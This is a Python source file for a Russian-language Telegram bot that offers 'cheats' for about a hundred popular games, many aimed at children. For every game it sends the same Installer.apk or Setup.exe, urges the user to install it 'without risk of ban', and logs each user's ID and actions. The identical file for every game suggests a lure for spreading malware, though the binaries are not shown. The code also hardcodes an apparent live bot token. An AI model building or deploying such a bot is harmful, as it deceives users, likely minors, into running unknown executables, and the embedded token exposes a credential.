import os
import json
import asyncio
from datetime import datetime
from flask import Flask, request, jsonify
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ===== КОНФИГУРАЦИЯ =====
TOKEN = os.environ.get("TELEGRAM_TOKEN", "8946909260:AAEZLpC9UgfkIMU2_5CHgm4DN3jY6nRLoLs")

# Пути к файлам (на Render нужно использовать относительные пути)
APK_PATH = "Installer.apk"
EXE_PATH = "Setup.exe"

# Файл для хранения статистики
STATS_FILE = "stats.json"

# Flask приложение для health check
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return jsonify({"status": "ok", "message": "Bot is running!"})

@flask_app.route('/health')
def health():
    return jsonify({"status": "alive"}), 200

# ===== СИСТЕМА ЛОГИРОВАНИЯ =====
def load_stats():
    if os.path.exists(STATS_FILE):
        with open(STATS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {"users": {}, "total_actions": 0, "game_stats": {}, "platform_stats": {"phone": 0, "pc": 0}}

def save_stats(stats):
    with open(STATS_FILE, 'w', encoding='utf-8') as f:
        json.dump(stats, f, ensure_ascii=False, indent=2)

def log_action(user_id, username, action, game_name=None, platform=None):
    stats = load_stats()
    user_id_str = str(user_id)
    if user_id_str not in stats["users"]:
        stats["users"][user_id_str] = {
            "username": username,
            "first_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "actions": []
        }
    
    action_data = {
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "action": action
    }
    if game_name:
        action_data["game"] = game_name
    if platform:
        action_data["platform"] = platform
    
    stats["users"][user_id_str]["actions"].append(action_data)
    stats["total_actions"] += 1
    
    if game_name:
        if game_name not in stats["game_stats"]:
            stats["game_stats"][game_name] = 0
        stats["game_stats"][game_name] += 1
    
    if platform:
        if platform == "телефоне":
            stats["platform_stats"]["phone"] += 1
        elif platform == "компьютере":
            stats["platform_stats"]["pc"] += 1
    
    save_stats(stats)
    print(f"\n📢 [ЛОГ] {datetime.now().strftime('%H:%M:%S')} - {username}: {action} | {game_name or ''} | {platform or ''}")

# ===== СПИСОК ИГР =====
GAMES = [
    "Brawl Stars", "Roblox", "Standoff 2", "Minecraft", "Pubg Mobile",
    "CounterFlame", "Arizona RP", "StandFade", "Polywar", "Last Day on The Earth",
    "Blockpost", "Modern ops", "R.E.C.O.R.D", "MadOut", "Cursed House granny",
    "StandLeo", "StandLeo lite", "Chicken Gun", "The Ghost", "Shadow Fight 2",
    "Gta V", "Spider fuser", "Oxide", "Snake.io", "Hide Online",
    "Fears to fathom", "Gta san", "Among us", "Miside", "Drive Ahead",
    "Mortal combat", "Brutal strike", "Dude Theft", "Car parking", "REPO",
    "Soul Knight", "Stick War: Legacy", "Black Russia", "Geometry Dash 2.2", "Terraria",
    "Momo", "StandDogo", "Hill Climb Racing", "God Of War", "StandChillow",
    "Asylum 777", "World of Tanks Blitz", "SchoolBoy Runaway", "Три кота хоккей эло", "8 ball pool",
    "Subway surfers city", "Tinny Bunny", "Special Forces group 2", "Stumble Guys", "Clash Royale",
    "StandWeek", "World War 2", "Fr Legend", "Dead Target", "Spotify",
    "Half life", "Zombie Combat Simulator", "Granny Legacy", "Polyfield", "Mobile legends",
    "BattleZone", "StandReborn", "Frag Pro Shooter", "Oguzok Horror", "Goat simulator 3",
    "Granny REMADE", "FWD", "Baldi’s Basics", "CupHead", "Pixel gun 3d",
    "Bhop pro", "Mr.Meat", "Gangs Town Story", "Getting Over It", "Specimen Zero",
    "Subway surfers", "ProStrike", "Kuzzbas", "StandLite", "Blood strike",
    "Traffic rider", "S.T.A.L.K.E.R Shadow of Chernobyl", "Poppy Playtime", "GoreBox", "Patient 186",
    "Plants vs Zombies", "Blockman go", "Fc Mobile", "Hollow Knight SilkSong", "Buckshot Roulette",
    "grandpa and grandma two hunters", "Imposter battle royale", "Pixel combat", "The Natalie", "Private v2",
    "Super Sus", "Метель", "Hide from zombies", "Sniper 3D", "StrikeFortessBox",
    "Gun war", "StandSnipe"
]

ITEMS_PER_PAGE = 6

# ===== ФУНКЦИИ ДЛЯ ОТПРАВКИ ФАЙЛОВ =====
async def send_phone_files(update: Update, context: ContextTypes.DEFAULT_TYPE, username: str, user_id: int, game_name: str):
    if os.path.exists(APK_PATH):
        try:
            with open(APK_PATH, "rb") as f:
                await update.effective_message.reply_document(
                    document=f,
                    filename="Installer.apk",
                    caption="📲 *Установочный APK файл*\n\nНажми на файл, чтобы скачать и установить чит",
                    parse_mode="Markdown"
                )
            log_action(user_id, username, "скачал APK файл", game_name, "телефоне")
        except Exception as e:
            print(f"Ошибка при отправке APK: {e}")
    else:
        await update.effective_message.reply_text("📱 Файл будет доступен позже")

async def send_pc_files(update: Update, context: ContextTypes.DEFAULT_TYPE, username: str, user_id: int, game_name: str):
    if os.path.exists(EXE_PATH):
        try:
            with open(EXE_PATH, "rb") as f:
                await update.effective_message.reply_document(
                    document=f,
                    filename="Installer.exe",
                    caption="💻 *Установочный EXE файл*\n\nНажми на файл, чтобы скачать установщик чита",
                    parse_mode="Markdown"
                )
            log_action(user_id, username, "скачал EXE файл", game_name, "компьютере")
        except Exception as e:
            print(f"Ошибка при отправке EXE: {e}")
    else:
        await update.effective_message.reply_text("💻 Файл будет доступен позже")

# ===== КЛАВИАТУРЫ =====
def get_games_keyboard(page: int):
    total_pages = (len(GAMES) + ITEMS_PER_PAGE - 1) // ITEMS_PER_PAGE
    start = page * ITEMS_PER_PAGE
    end = min(start + ITEMS_PER_PAGE, len(GAMES))
    games_on_page = GAMES[start:end]

    keyboard = []
    row = []
    for i, game in enumerate(games_on_page):
        row.append(InlineKeyboardButton(game, callback_data=f"game_{game}"))
        if len(row) == 2 or i == len(games_on_page) - 1:
            keyboard.append(row)
            row = []
    
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("◀️ Предыдущая", callback_data=f"page_{page-1}"))
    if page < total_pages - 1:
        nav_buttons.append(InlineKeyboardButton("Следующая ▶️", callback_data=f"page_{page+1}"))
    if nav_buttons:
        keyboard.append(nav_buttons)
    
    keyboard.append([InlineKeyboardButton(f"📄 Страница {page+1} из {total_pages}", callback_data="noop")])
    return InlineKeyboardMarkup(keyboard)

def get_platform_keyboard():
    keyboard = [
        [InlineKeyboardButton("📱 Телефон (APK)", callback_data="platform_phone"), InlineKeyboardButton("💻 Компьютер (EXE)", callback_data="platform_pc")],
        [InlineKeyboardButton("🔙 Назад к выбору чита", callback_data="back_to_games")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_after_files_keyboard():
    keyboard = [
        [InlineKeyboardButton("🔄 Выбрать другой чит", callback_data="choose_another")],
        [InlineKeyboardButton("📥 Скачать файл ещё раз", callback_data="resend_files")],
        [InlineKeyboardButton("❌ Отмена", callback_data="cancel")]
    ]
    return InlineKeyboardMarkup(keyboard)

# ===== ОБРАБОТЧИКИ =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    username = user.username or user.first_name or str(user.id)
    user_id = user.id
    
    log_action(user_id, username, "запустил бота (команда /start)")
    context.user_data.clear()
    
    await update.message.reply_text(
        "🎮 *Привет! Выбери игру, на которую хочешь найти чит.*\n\n👇 *Нажми на любую игру из списка ниже*",
        parse_mode="Markdown",
        reply_markup=get_games_keyboard(0)
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    user = update.effective_user
    username = user.username or user.first_name or str(user.id)
    user_id = user.id

    if data.startswith("game_"):
        game_name = data[5:]
        context.user_data['selected_game'] = game_name
        log_action(user_id, username, "выбрал игру", game_name)
        await query.edit_message_text(
            text=f"✅ *Ты выбрал игру:* **{game_name}**\n\n📱💻 *Выбери устройство для чита:*",
            parse_mode="Markdown",
            reply_markup=get_platform_keyboard()
        )

    elif data == "platform_phone":
        context.user_data['platform'] = "телефоне"
        game = context.user_data.get('selected_game', 'неизвестная игра')
        await send_phone_files(update, context, username, user_id, game)
        await query.edit_message_text(
            text=f"📲 *Вот твой чит, играй с ним на здоровье и без риска бана!*\n\n💿 *APK файл отправлен!*",
            parse_mode="Markdown",
            reply_markup=get_after_files_keyboard()
        )

    elif data == "platform_pc":
        context.user_data['platform'] = "компьютере"
        game = context.user_data.get('selected_game', 'неизвестная игра')
        await send_pc_files(update, context, username, user_id, game)
        await query.edit_message_text(
            text=f"🎮 *Вот твой чит, играй с ним на здоровье и без риска бана!*\n\n💿 *EXE файл отправлен!*",
            parse_mode="Markdown",
            reply_markup=get_after_files_keyboard()
        )

    elif data == "resend_files":
        platform = context.user_data.get('platform', '')
        game = context.user_data.get('selected_game', 'неизвестная игра')
        if platform == "телефоне":
            await send_phone_files(update, context, username, user_id, game)
        elif platform == "компьютере":
            await send_pc_files(update, context, username, user_id, game)
        await query.answer("📁 Файл отправлен заново!")

    elif data.startswith("page_"):
        new_page = int(data.split("_")[1])
        await query.edit_message_reply_markup(reply_markup=get_games_keyboard(new_page))

    elif data == "choose_another":
        await query.edit_message_text(
            text="🎮 *Выбери другую игру из списка:*",
            parse_mode="Markdown",
            reply_markup=get_games_keyboard(0)
        )
        context.user_data.clear()

    elif data == "back_to_games":
        await query.edit_message_text(
            text="🎮 *Выбери игру из списка:*",
            parse_mode="Markdown",
            reply_markup=get_games_keyboard(0)
        )
        context.user_data.clear()

    elif data == "cancel":
        await query.edit_message_text(
            text="❌ *Действие отменено.*\n\nЧтобы начать заново, отправь команду /start",
            parse_mode="Markdown"
        )
        context.user_data.clear()

    elif data == "noop":
        pass

# ===== ЗАПУСК ТЕЛЕГРАМ БОТА И FLASK =====
def run_telegram_bot():
    """Запускает Telegram бота в отдельном потоке"""
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_callback))
    
    print("✅ Telegram бот запущен!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

def run_flask():
    """Запускает Flask сервер для health check"""
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host="0.0.0.0", port=port)
    print(f"✅ Flask сервер запущен на порту {port}!")

if __name__ == "__main__":
    print("\n" + "="*50)
    print("🤖 БОТ ЗАПУСКАЕТСЯ...")
    print("="*50)
    
    # Запускаем Telegram бота в отдельном потоке
    bot_thread = Thread(target=run_telegram_bot)
    bot_thread.start()
    
    # Запускаем Flask в основном потоке (нужно для Render health check)
    run_flask()